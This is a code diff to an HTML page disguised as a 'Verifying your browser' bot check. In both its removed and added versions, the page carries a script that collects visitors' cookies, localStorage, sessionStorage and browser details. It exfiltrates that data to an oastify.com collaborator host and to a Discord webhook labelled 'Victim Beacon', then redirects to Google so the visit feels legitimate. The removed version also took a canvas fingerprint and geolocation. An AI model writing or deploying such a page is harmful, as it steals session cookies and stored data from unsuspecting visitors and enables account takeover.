@@ -20,74 +20,46 @@
   <h1>🔐 Verifying your browser...</h1>
   <p id="status">Please wait while we verify you're not a bot.</p>
 
-  <script>
-    (async () => {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const ref = document.referrer;
-      const cookies = document.cookie || "N/A";
-      const local = JSON.stringify(localStorage);
-      const session = JSON.stringify(sessionStorage);
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+<script>
+(async () => {
+  function safeBase64(str) {
+    return btoa(unescape(encodeURIComponent(str)));
+  }
 
-      // Optional: Basic canvas fingerprint
-      let canvasFP = "";
-      try {
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillText("🕵️‍♂️ Fingerprint", 2, 2);
-        canvasFP = canvas.toDataURL();
-      } catch (e) {
-        canvasFP = "error";
-      }
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const ref = document.referrer;
+  const cookies = document.cookie || "N/A";
+  const local = JSON.stringify(localStorage);
+  const session = JSON.stringify(sessionStorage);
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      // Optional: Geolocation
-      let geoData = "N/A";
-      try {
-        const geo = await fetch("https://ipinfo.io/json?token=demo");
-        geoData = await geo.text();
-      } catch (e) {
-        geoData = "Geo fetch failed";
-      }
+  const payload = {
+    userAgent: ua,
+    platform: platform,
+    referrer: ref,
+    cookies: cookies,
+    localStorage: local,
+    sessionStorage: session,
+    timezone: timezone
+  };
 
-      const payload = {
-        userAgent: ua,
-        platform: platform,
-        referrer: ref,
-        cookies: cookies,
-        localStorage: local,
-        sessionStorage: session,
-        timezone: timezone,
-        canvasFingerprint: canvasFP,
-        geolocation: geoData
-      };
+  // Send to Burp Collaborator
+  new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?" + safeBase64(JSON.stringify(payload));
 
-      // ✅ Send to Burp Collaborator
-      new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?" + btoa(JSON.stringify(payload));
+  // Send to Discord webhook
+  await fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `🧲 **Victim Beacon**\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+    })
+  });
 
-      // ✅ Send to Discord Webhook
-      await fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `🧲 **Victim Beacon**\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
-        })
-      });
+  // Redirect to a safe-looking page
+  window.location.href = "https://www.google.com";
+})();
+</script>
 
-      // ✅ (Optional) Send to your own C2
-      /*
-      await fetch("https://your-c2-server.com/beacon", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      */
-
-      // ✅ Redirect after beacon (to make it feel legit)
-      window.location.href = "https://www.google.com";
-    })();
-  </script>
 </body>
 </html>
